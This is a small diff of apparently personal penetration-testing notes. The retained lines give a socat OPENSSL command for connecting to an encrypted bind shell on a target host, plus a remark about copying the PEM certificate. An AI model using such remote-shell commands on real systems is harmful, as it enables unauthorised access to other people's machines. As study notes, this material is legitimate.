@@ -42,16 +42,3 @@ The same technique for an socat encrypted shells would apply for a bind shell:
   socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
               Attacker machine, again, note that even for a Windows target, the certificate must be
               used with the listener, so copying the PEM file across for a bind shell is required
-
-
-
-
-
-
-
-
-
-
-
-Informational:
-  rlwrap (technique is especially usefull when dealing with Windows shells)
